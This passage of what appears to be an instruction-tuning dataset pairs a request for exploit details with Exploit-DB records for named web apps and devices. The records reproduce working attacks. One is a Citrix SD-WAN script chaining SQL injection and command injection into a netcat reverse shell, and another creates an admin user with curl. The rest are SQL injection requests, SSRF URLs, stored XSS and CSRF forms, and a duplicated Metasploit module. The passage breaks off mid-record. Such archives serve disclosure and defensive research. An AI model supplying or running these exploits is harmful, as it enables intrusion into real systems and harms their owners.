[
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47960",
        "output": {
            "ID": "47960",
            "File": "exploits/asp/webapps/47960.txt",
            "Description": "OLK Web Store 2020 - Cross-Site Request Forgery",
            "Date Published": "2020-01-24",
            "Author": "Joel Aviad Ossi",
            "Type": "webapps",
            "Platform": "asp",
            "Port": "80",
            "Date Added": "2020-01-24",
            "Date Updated": "2020-01-28",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: OLK Web Store 2020 - Cross-Site Request Forgery\n# Google Dork: intext:\"TopManage \u00ae 2002 - 2020\"\n# Date: 2020-01-13\n# Exploit Author: Joel Aviad Ossi\n# Vendor Homepage: http://www.topmanage.com/\n# Software Link: http://www.topmanage.com/microsites/olk-web-store/\n# Version: 2020\n# Tested on: N/A\n# CVE : N/A\n\n# Reference: https://websec.nl/news.php \n\nPOST /olk/client/login.asp HTTP/1.1\nHost: examplesite.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 88\nOrigin: https://examplesite.com\nConnection: close\nReferer: https://examplesite.com/olk/client/login.asp?se=Y\nCookie: myLng=en; ASPSESSIONIDCGARQSCD=JGFFLBIAAKGBKANKLAPHMEDH\nUpgrade-Insecure-Requests: 1\n\ndbID=0&UserName=%22%3EPOC&Password=%22%3ECSRF&newLng=en&btnEnter=Enter&sHeight=400&other="
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47589",
        "output": {
            "ID": "47589",
            "File": "exploits/aspx/webapps/47589.txt",
            "Description": "SD.NET RIM 4.7.3c - 'idtyp' SQL Injection",
            "Date Published": "2019-11-05",
            "Author": "Fabian Mosch_ Nick Theisinger",
            "Type": "webapps",
            "Platform": "aspx",
            "Port": "80",
            "Date Added": "2019-11-05",
            "Date Updated": "2019-11-05",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: SD.NET RIM 4.7.3c - 'idtyp' SQL Injection\n# Date: 2019-11-05\n# Exploit Author: Fabian Mosch (r-tec IT Security GmbH)\n# Vendor Homepage: https://www.sitzungsdienst.net/\n# Software Link: https://www.sitzungsdienst.net/2018/12/sd-net-rim-4-7-3-veroeffentlicht/\n# Version: < 4.7.3c\n# Tested on: < 4.7.3c\n# CVE : N/A\n\n# SD.NET RIM before version 4.7.3c is vulnerable to a SQL-Injection vulnerability. To Exploit the vulnerability \n# an attacker has to inject arbitrary SQL Statements in the following POST parameters:\n\nPOST /vorlagen/?__=SOMEBASE64 HTTP/1.1\nHost: VulnerableHost.com\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: de,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 182\nOrigin: https://vulnerablehost.com\nConnection: close\nReferer: https://vulnerablehost.com/vorlagen/?__=BASE64\nCookie: PHPSESSID250=SESSIONID\nUpgrade-Insecure-Requests: 1\n\nreqid=f48de4c24ae1b72dd37ebde6f6b40544&nummer=t&idtyp=-1\u2019INJECTHERE&idgremium=-1\u2019INJECTHERE&datefrom=TT.MM.JJJJ&dateto=TT.MM.JJJJ&csrftoken=CSRFToken\n\n# The attacker is then redirected with a 302 redirect to an URL /templates/?__=NEWBASE64 as GET request. \n# By issuing the second request the arbitrary SQL-Statement gets executed."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47112",
        "output": {
            "ID": "47112",
            "File": "exploits/cgi/webapps/47112.py",
            "Description": "Citrix SD-WAN Appliance 10.2.2 - Authentication Bypass / Remote Command Execution",
            "Date Published": "2019-07-12",
            "Author": "Chris Lyne",
            "Type": "webapps",
            "Platform": "cgi",
            "Port": "",
            "Date Added": "2019-07-12",
            "Date Updated": "2019-07-12",
            "Verified": "1",
            "Codes": [
                "CVE-2019-12991;CVE-2019-12989"
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Citrix SD-WAN Appliance 10.2.2 Auth Bypass and Remote Command Execution\n# Date: 2019-07-12\n# Exploit Author: Chris Lyne (@lynerc)\n# Vendor Homepage: https://www.citrix.com\n# Product: Citrix SD-WAN\n# Software Link: https://www.citrix.com/downloads/citrix-sd-wan/\n# Version: Tested against 10.2.2\n# Tested on: \n#\t- Vendor-provided .OVA file\n# CVE: CVE-2019-12989, CVE-2019-12991\n#\n# See Also:\n# https://www.tenable.com/security/research/tra-2019-32\n# https://medium.com/tenable-techblog/an-exploit-chain-against-citrix-sd-wan-709db08fb4ac\n# https://support.citrix.com/article/CTX251987\n#\n# This code exploits both CVE-2019-12989 and CVE-2019-12991\n# You'll need your own Netcat listener\n\nimport requests, urllib\nimport sys, os, argparse\nimport random\nfrom OpenSSL import crypto\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nTIMEOUT = 10 # sec\n\ndef err_and_exit(msg):\n    print '\\n\\nERROR: ' + msg + '\\n\\n'\n    sys.exit(1)\n\n# CVE-2019-12989\n# auth bypass via file write\ndef do_sql_injection(base_url):\n    url = base_url + '/sdwan/nitro/v1/config/get_package_file?action=file_download'\n    headers = { 'SSL_CLIENT_VERIFY' : 'SUCCESS' }\n    token = random.randint(10000, 99999)\n    json = {\n        \"get_package_file\": {\n            \"site_name\"         : \"blah' union select 'tenable','zero','day','research' INTO OUTFILE '/tmp/token_\" + str(token) + \"';#\",\n            \"appliance_type\"    : \"primary\",\n            \"package_type\"      : \"active\"\n        }\n    }\n\n    try:\n        r = requests.post(url, headers=headers, json=json, verify=False, timeout=TIMEOUT)\n    except requests.exceptions.ReadTimeout:\n        return None\n\n    # error is expected\n    expected = {\"status\":\"fail\",\"message\":\"Invalid value specified for site_name or appliance_type\"}\n    if (r.status_code == 400 and r.json() == expected):\n        return token\n    else:\n        return None\n\n# CVE-2019-12991\n# spawns a reverse shell\ndef do_cmd_injection(base_url, token, ncip, ncport):\n    cmd = 'sudo nc -nv %s %d -e /bin/bash' % (ncip, ncport) # \n    url = base_url + '/cgi-bin/installpatch.cgi?swc-token=%d&installfile=`%s`' % (token, cmd)\n    success = False\n    try:\n        r = requests.get(url, verify=False, timeout=TIMEOUT)\n    except requests.exceptions.ReadTimeout:\n        success = True\n\n    # a timeout is success. it means we should have a shell\n    return success\n\n##### MAIN #####\n\ndesc = 'Citrix SD-WAN Appliance Auth Bypass and Remote Command Execution'\narg_parser = argparse.ArgumentParser(description=desc)\narg_parser.add_argument('-t', required=True, help='Citrix SD-WAN IP Address (Required)')\narg_parser.add_argument('-ncip', required=True, help='Netcat listener IP')\narg_parser.add_argument('-ncport', type=int, default=4444, help='Netcat listener port (Default: 4444)')\n\nargs = arg_parser.parse_args()\n\nprint \"Starting... be patient. This takes a sec.\"\n\n# Path to target app\nbase_url = 'https://' + args.t\n\n# do sql injection to get a swc-token for auth bypass\ntoken = do_sql_injection(base_url)\nif (token is None):\n    err_and_exit('SQL injection failed.')\n\nprint 'SQL injection successful! Your swc-token is ' + str(token) + '.'\n\n# if this worked, do the command injection\n# create a new admin user and spawn a reverse shell\nsuccess = do_cmd_injection(base_url, token, args.ncip, args.ncport)\n\nif success is False:\n    err_and_exit('Not so sure command injection worked. Expected a timeout.')\n\nprint 'Seems like command injection succeeded.'\nprint 'Check for your shell!\\n'\nprint 'To add an admin web user, run this command: perl /home/talariuser/bin/user_management.pl addUser eviladmin evilpassword 1'"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 45920",
        "output": {
            "ID": "45920",
            "File": "exploits/cgi/webapps/45920.txt",
            "Description": "Synaccess netBooter NP-02x/NP-08x 6.8 - Authentication Bypass",
            "Date Published": "2018-11-30",
            "Author": "LiquidWorm",
            "Type": "webapps",
            "Platform": "cgi",
            "Port": "80",
            "Date Added": "2018-11-30",
            "Date Updated": "2018-11-30",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Synaccess netBooter NP-02x/NP-08x 6.8 Authentication Bypass\n\n\nVendor: Synaccess Networks Inc.\nProduct web page: https://www.synaccess-net.com\nAffected version: NP-0201D (ver 6.8C)\n                  NP-02    (ver 6.5C)\n                  NP-02    (ver 6.4BC)\n                  NP-0801D (ver 6.4A)\n                  NP-08    (ver 6.10)\n                  NP-02    (ver 5.53BC)\n\nSummary: netBooter NP-02B and NP-02BH provide independent\ncontrol of one or two outlets in a small, robust form factor.\nManageable via TCP/IP network or direct serial connection\nand 1U brackets (optional) for mounting. Control power to\nyour devices with the ability to fit just about anywhere.\n\nnetBooter NP-0801DU and NP-0801DUH PDUs provide secured\nremote power source management of 8 independent outlets.\nIncludes true RMS AC current reading and environment\ntemperature monitoring* via TCP/IP networks or local direct\nconnection.\n\nDesc: netBooter suffers from an authentication bypass\nvulnerability due to missing control check when calling\nwebNewAcct.cgi script while creating users. This allows an\nunauthenticated attacker to create admin user account and\nbypass authentication giving her the power to turn off a\npower supply to a resource.\n\nTested on: Synaccess server\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2018-5500\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5500.php\n\n\n05.11.2018\n\n--\n\nPoC:\n\ncurl -i http://10.0.0.17/webNewAcct.cgi --data \"A1=hackerplusplus&A2=1234&A2=1234\""
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47542",
        "output": {
            "ID": "47542",
            "File": "exploits/hardware/webapps/47542.txt",
            "Description": "AUO SunVeillance Monitoring System 1.1.9e - 'MailAdd' SQL Injection",
            "Date Published": "2019-10-24",
            "Author": "Luca.Chiou",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2019-10-24",
            "Date Updated": "2019-10-25",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: AUO SunVeillance Monitoring System 1.1.9e - 'MailAdd' SQL Injection\n# Date: 2019-10-24\n# Exploit Author: Luca.Chiou\n# Vendor Homepage: https://www.auo.com/zh-TW\n# Version: AUO SunVeillance Monitoring System all versions prior to v1.1.9e\n# Tested on: It is a proprietary devices: https://solar.auo.com/en-global/Support_Download_Center/index\n# CVE: N/A\n\n# 1. Description:\n# AUO SunVeillance Monitoring System all versions prior to v1.1.9e that is vulnerable to SQL Injection.\n# The vulnerability can allow the attacker inject maliciously SQL command to the server which allows \n# the attacker to read privileged data.\n\n# 2. Proof of Concept:\n\n(1) Access the sending mail page of AUO SunVeillance Monitoring System  (/Solar_Web_Portal/mvc_send_mail.aspx) without any authentication. \n    There is a parameter, MailAdd, in mvc_send_mail.aspx.\n(2) Modify the value of parameter MailAdd with single quotation. The error messages contains oracle database information.\n(3) By using sqlmap tools, attacker can acquire the database list which in server side.\n\ncmd: sqlmap.py -u \u201chttps://<host>/Solar_Web_Portal/mvc_send_mail.aspx?MailAdd=\u201d -p MailAdd \u2013dbs\n\n(4) Furthermore, there are a few SQL Injection vulnerabilities in other fields.\n\npicture_manage_mvc.aspx (parameter: plant_no)\nswapdl_mvc.aspx (parameter: plant_no)\naccount_management.aspx (parameter: Text_Postal_Code, Text_Dis_Code)\n\nThank you for your kind assistance.\n\nLuca"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47541",
        "output": {
            "ID": "47541",
            "File": "exploits/hardware/webapps/47541.txt",
            "Description": "AUO SunVeillance Monitoring System 1.1.9e - Incorrect Access Control",
            "Date Published": "2019-10-24",
            "Author": "Luca.Chiou",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2019-10-24",
            "Date Updated": "2019-10-25",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: AUO SunVeillance Monitoring System 1.1.9e - Incorrect Access Control\n# Date: 2019-10-24\n# Exploit Author: Luca.Chiou\n# Vendor Homepage: https://www.auo.com/zh-TW\n# Version: AUO SunVeillance Monitoring System all versions prior to v1.1.9e\n# Tested on: It is a proprietary devices: https://solar.auo.com/en-global/Support_Download_Center/index\n# CVE: N/A\n \n# 1. Description:\n# An issue was discovered in AUO SunVeillance Monitoring System.\n# There is an incorrect access control vulnerability that can allow the attacker to \n# bypass the authentication mechanism, and upload files to the server without any authentication.\n \n# 2. Proof of Concept:\n(1) Access the picture management page of AUO SunVeillance Monitoring System (/Solar_Web_Portal/Picture_Manage_mvc.aspx) without \n    any authentication. As a guest role, user is not allowed to upload a picture. However, there are two parameters, Act and authority, in Picture_Manage_mvc.aspx.\n(2) Modify the value of parameter authority from 40 to 100. You can find out the upload button is enabled.\n(3) Now you can upload a file successfully.\n(4) The file which we uploaded is storing in server side. It\u2019s means any user without authentication can upload files to server side.\n \nThank you for your kind assistance.\n\nLuca"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 45818",
        "output": {
            "ID": "45818",
            "File": "exploits/hardware/webapps/45818.txt",
            "Description": "D-LINK Central WifiManager CWM-100 - Server-Side Request Forgery",
            "Date Published": "2018-11-12",
            "Author": "hyp3rlinx",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2018-11-12",
            "Date Updated": "2018-11-13",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Server-Side Request Forgery (SSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: D-LINK Central WifiManager CWM-100 - Server-Side Request Forgery\n# Author: John Page (aka hyp3rlinx)\n# Date: 2018-11-09\n# Vendor: http://us.dlink.com\n# Product Link: http://us.dlink.com/products/business-solutions/central-wifimanager-software-controller/\n# Version: Version 1.03 r0098\n# CVE: N/A\n# References:\n\n# [Security Issue]\n# Using a web browser or script SSRF can be initiated against internal/external systems \n# to conduct port scans by leveraging D-LINKs MailConnect component.\n\n# The MailConnect feature on D-Link Central WiFiManager CWM-100 1.03 r0098 devices is intended \n# to check a connection to an SMTP server but actually allows outbound TCP to any port on any IP address, \n# leading to SSRF, as demonstrated by an index.php/System/MailConnect/host/127.0.0.1/port/22/secure/ URI.\n# This can undermine accountability of where scan or connections actually came from and or bypass \n# the FW etc. This can be automated via script or using Web Browser.\n\n# [Exploit/POC]\nhttps://VICTIM-IP/index.php/System/MailConnect/host/port/secure/\n\nreply: OK\n\n#Scan internal port 22 SSH:\n\nhttps://VICTIM-IP/index.php/System/MailConnect/host/VICTIM-IP/port/22/secure/\nreply: OK"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47250",
        "output": {
            "ID": "47250",
            "File": "exploits/hardware/webapps/47250.rb",
            "Description": "D-Link DIR-600M - Authentication Bypass (Metasploit)",
            "Date Published": "2019-08-14",
            "Author": "Devendra Singh Solanki",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "80",
            "Date Added": "2019-08-14",
            "Date Updated": "2019-08-14",
            "Verified": "0",
            "Codes": [
                "CVE-2019-13101"
            ],
            "Tags": [
                "Metasploit Framework (MSF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'CVE-2019-13101 D-Link DIR-600M Incorrect Access Control',\n      'Description'     => %q{\n          This module attempts to find D-Link router DIR-600M which is\nvulnerable to Incorrect Access Control. The vulnerability exists in\n        wan.htm, which is accessible without authentication. This\nvulnerabilty can lead an attacker to manipulate WAN settings.\n        This module has been tested successfully on Firmware Version\n3.01,3.02,3.03,3.04,3.05,3.06.\n      },\n      'Author'          => [ 'Devendra Singh Solanki <devendra0x0[at]gmail.com>' ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          'CVE', '2019-13101'\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => 'Aug 08 2019'))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({'uri' => '/login.htm'})\n    if res.nil? or res.code == 404\n      print_error(\"#{rhost}:#{rport} - Host is down.\")\n      return\n    end\n\n    if res and res.code == 200 and res.body =~ /D-Link/\n      print_good(\"#{rhost}:#{rport} - It is a D-Link router\")\n    else\n      print_error(\"#{rhost}:#{rport} - Not a D-Link router\")\n      return\n    end\n\n    res = send_request_cgi({'uri' => '/wan.htm'})\n\n    if res and res.code == 200 and res.body =~ /PPPoE/\n      print_good(\"#{rhost}:#{rport} - Router is vulnerable for\nIncorrect Access Control. CVE-2019-13101\")\n    else\n      print_error(\"#{rhost}:#{rport} - Router is with different firmware.\")\n      return\n    end\n\n  end\nend"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47250",
        "output": {
            "ID": "47250",
            "File": "exploits/hardware/webapps/47250.rb",
            "Description": "D-Link DIR-600M - Authentication Bypass (Metasploit)",
            "Date Published": "2019-08-14",
            "Author": "Devendra Singh Solanki",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "80",
            "Date Added": "2019-08-14",
            "Date Updated": "2019-08-14",
            "Verified": "0",
            "Codes": [
                "CVE-2019-13101"
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'CVE-2019-13101 D-Link DIR-600M Incorrect Access Control',\n      'Description'     => %q{\n          This module attempts to find D-Link router DIR-600M which is\nvulnerable to Incorrect Access Control. The vulnerability exists in\n        wan.htm, which is accessible without authentication. This\nvulnerabilty can lead an attacker to manipulate WAN settings.\n        This module has been tested successfully on Firmware Version\n3.01,3.02,3.03,3.04,3.05,3.06.\n      },\n      'Author'          => [ 'Devendra Singh Solanki <devendra0x0[at]gmail.com>' ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          'CVE', '2019-13101'\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => 'Aug 08 2019'))\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n  end\n\n  def run_host(ip)\n    res = send_request_cgi({'uri' => '/login.htm'})\n    if res.nil? or res.code == 404\n      print_error(\"#{rhost}:#{rport} - Host is down.\")\n      return\n    end\n\n    if res and res.code == 200 and res.body =~ /D-Link/\n      print_good(\"#{rhost}:#{rport} - It is a D-Link router\")\n    else\n      print_error(\"#{rhost}:#{rport} - Not a D-Link router\")\n      return\n    end\n\n    res = send_request_cgi({'uri' => '/wan.htm'})\n\n    if res and res.code == 200 and res.body =~ /PPPoE/\n      print_good(\"#{rhost}:#{rport} - Router is vulnerable for\nIncorrect Access Control. CVE-2019-13101\")\n    else\n      print_error(\"#{rhost}:#{rport} - Router is with different firmware.\")\n      return\n    end\n\n  end\nend"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47979",
        "output": {
            "ID": "47979",
            "File": "exploits/hardware/webapps/47979.txt",
            "Description": "Fifthplay S.A.M.I 2019.2_HP - Persistent Cross-Site Scripting",
            "Date Published": "2020-01-29",
            "Author": "LiquidWorm",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2020-01-29",
            "Date Updated": "2020-01-30",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Fifthplay S.A.M.I 2019.2_HP - Persistent Cross-Site Scripting\n# Date: 2020-01-29\n# Exploit Author: LiquidWorm\n# Vendor: Fifthplay NV\n# Vendor Homepage: https://www.fifthplay.com\n# Version: 2019.2_HP\n# Tested on: Linux\n# CVE : -\n\nFifthplay S.A.M.I - Service And Management Interface Unauthenticated Stored XSS\n\n\nVendor: Fifthplay NV\nProduct web page: https://www.fifthplay.com\nAffected version: Platform: HAM V1.2\n                            HAM V1.1\n                            HAM V1.0\n                            DINHAM 10W\n                  Image Version: 2019.3-20190605144803\n                                 2019.2_HP-20190808154634\n                                 2018.4_HP-20181015152950\n                                 2018.2-20180516100815\n                                 2017.2_HP-20180213083050\n                                 2013.4_HP-201309301203\n                  AMP Version: 2019.2_HP\n                               2018.4_HP\n                               2017.2_HP\n                               2013.4_HP\n                               R20.19.03\n                               R20.18.02\n                  Fix: 2017.2-HP4\n                       2018.4_HP3\n                       2018.5_HP7\n                       2019.2_HP3\n                       2019.3_HP1\n\nSummary: Fifthplay is a Belgian high-tech player and a subsidiary of Niko Group. \nWe specialise in enriching smart homes and buildings for almost 10 years, and in\nservices that provide comfort and energy. Our gateway provides a modular approach\nto integrating old and new technologies, such as smart meters, optical meters,\nsockets, switches. Fifthplay is a trendsetter with regards to smart homes and buildings\nand one of the sector's most innovative companies.\n\nDesc: The application suffers from an unauthenticated stored XSS through POST request.\nThe issue is triggered when input passed via several parameters is not properly\nsanitized before being returned to the user. This can be exploited to execute arbitrary\nHTML and script code in a user's browser session in context of an affected site. The\napplication interface also allows users to perform certain actions via HTTP requests\nwithout performing any validity checks to verify the requests. This can be exploited\nto perform certain actions if a user visits a malicious web site.\n\nTested on: lighttpd/1.4.33\n           PHP/5.4.33\n           PHP/5.3.19\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2020-5561\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5561.php\n\n\n29.09.2019\n\n--\n\n\nStored XSS:\n-----------\n\n<html>\n  <body>\n    <form action=\"http://192.168.11.1/?page=networksettings\" method=\"POST\">\n      <input type=\"hidden\" name=\"server\" value='\"><script>prompt(251)</script>' />\n      <input type=\"hidden\" name=\"port\" value='\"><script>prompt(252)</script>' />\n      <input type=\"hidden\" name=\"auth\" value=\"1\" />\n      <input type=\"hidden\" name=\"user\" value='\"><script>prompt(253)</script>' />\n      <input type=\"hidden\" name=\"pass\" value='\"><script>prompt(254)</script>' />\n      <input type=\"hidden\" name=\"submit\" value=\"Change\" />\n      <input type=\"submit\" value=\"Write\" />\n    </form>\n  </body>\n</html>\n\n\nSet proxy CSRF:\n---------------\n<html>\n  <body>\n    <form action=\"http://192.168.11.1/?page=networksettings\" method=\"POST\">\n      <input type=\"hidden\" name=\"server\" value=\"proxy.segfault.mk\" />\n      <input type=\"hidden\" name=\"port\" value=\"8080\" />\n      <input type=\"hidden\" name=\"auth\" value=\"1\" />\n      <input type=\"hidden\" name=\"user\" value=\"testuser\" />\n      <input type=\"hidden\" name=\"pass\" value=\"testpass\" />\n      <input type=\"hidden\" name=\"submit\" value=\"Change\" />\n      <input type=\"submit\" value=\"Write\" />\n    </form>\n  </body>\n</html>\n\n\nDelete proxy CSRF:\n------------------\n\n<html>\n  <body>\n    <form action=\"http://192.168.11.1/?page=networksettings\" method=\"POST\">\n      <input type=\"hidden\" name=\"server\" value=\"proxy.segfault.mk\" />\n      <input type=\"hidden\" name=\"port\" value=\"8080\" />\n      <input type=\"hidden\" name=\"auth\" value=\"1\" />\n      <input type=\"hidden\" name=\"user\" value=\"testuser\" />\n      <input type=\"hidden\" name=\"pass\" value=\"testpass\" />\n      <input type=\"hidden\" name=\"delete\" value=\"Delete\" />\n      <input type=\"submit\" value=\"Clear\" />\n    </form>\n  </body>\n</html>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47961",
        "output": {
            "ID": "47961",
            "File": "exploits/hardware/webapps/47961.txt",
            "Description": "Genexis Platinum-4410 2.1 - Authentication Bypass",
            "Date Published": "2020-01-24",
            "Author": "Husinul Sanub",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2020-01-24",
            "Date Updated": "2020-01-28",
            "Verified": "0",
            "Codes": [
                "CVE-2020-6170"
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "http://www.exploit-db.com/screenshots/idlt48000/burp.png",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title:  Genexis Platinum-4410 2.1 - Authentication Bypass\n# Date: 20220-01-08\n# Exploit Author: Husinul Sanub\n# Author Contact: https://www.linkedin.com/in/husinul-sanub-658239106/\n# Vulnerable Product: Genexis Platinum-4410 v2.1 Home Gateway Router https://genexis.co.in/product/ont/\n# Firmware version: P4410-V2\u20131.28\n# Vendor Homepage: https://genexis.co.in/\n# Reference: https://medium.com/@husinulzsanub/exploiting-router-authentication-through-web-interface-68660c708206\n# CVE: CVE-2020-6170\n\nVulnerability Details\n======================\nGenexis Platinum-4410 v2.1 Home Gateway Router discloses passwords of each users(Admin,GENEXIS,user3) in plain text behind login page source \u201chttp://192.168.1.1/cgi-bin/index2.asp\". This could potentially allow a remote attacker access sensitive information and perform actions such as reset router, changing passwords, upload malicious firmware etc.\n\nHow to reproduce\n===================\nSuppose 192.168.1.1 is the router IP and check view page source of login page \u201chttp://192.168.1.1/cgi-bin/index2.asp\",There we can found passwords for each login accounts in clear text.\n\n\nPOC\n=========\n* https://youtu.be/IO_Ez4XH-0Y"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47764",
        "output": {
            "ID": "47764",
            "File": "exploits/hardware/webapps/47764.txt",
            "Description": "Inim Electronics Smartliving SmartLAN 6.x - Unauthenticated Server-Side Request Forgery",
            "Date Published": "2019-12-10",
            "Author": "LiquidWorm",
            "Type": "webapps",
            "Platform": "hardware",
            "Port": "",
            "Date Added": "2019-12-10",
            "Date Updated": "2019-12-10",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Server-Side Request Forgery (SSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Inim Electronics Smartliving SmartLAN 6.x - Unauthenticated Server-Side Request Forgery\n# Author: LiquidWorm\n# Date: 2019-12-09\n# Product web page: https://www.inim.biz\n# Link: https://www.inim.biz/en/antintrusion-control-panels/home-automation/control-panel-smartliving?\n# Version: 6.x\n# Advisory ID: ZSL-2019-5545\n# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5545.php\n\nInim Electronics Smartliving SmartLAN/G/SI <=6.x Unauthenticated SSRF\n\n\nVendor: INIM Electronics s.r.l.\nProduct web page: https://www.inim.biz\nLink: https://www.inim.biz/en/antintrusion-control-panels/home-automation/control-panel-smartliving?\nAffected version: <=6.x\nAffected models: SmartLiving 505\n                 SmartLiving 515\n                 SmartLiving 1050, SmartLiving 1050/G3\n                 SmartLiving 10100L, SmartLiving10100L/G3\n\nSummary: SmartLiving anti-intrusion control panel and security system provides\nimportant features rarely found in residential, commercial or industrial application\nsystems of its kind. This optimized-performance control panel provides first-rate\nfeatures such as: graphic display, text-to-speech, voice notifier, flexible hardware,\nend-to-end voice transmission (voice-on-bus), IP connectivity.\n\nSMARTLAN/SI:\nThe system-on-chip platform used in the SmartLAN/SI accessory board provides point-to-point\nnetworking capability and fast connectivity to the Internet. Therefore, it is possible\nto set up a remote connection and program or control the system via the SmartLeague\nsoftware application. In effect, the SmartLAN/SI board grants the same level of access\nto the system as a local RS232 connection.\n\nSMARTLAN/G:\nThe SmartLAN/G board operates in the same way as the SmartLAN/SI but in addition provides\nadvanced remote-access and communication functions. The SmartLAN/G board is capable of\nsending event-related e-mails automatically. Each e-mail can be associated with a subject,\nan attachment and a text message. The attachment can be of any kind and is saved to an\nSD card. The message text can contain direct links to domains or IP addressable devices,\nsuch as a security cameras. In addition to e-mails, the SmartLAN/G board offers 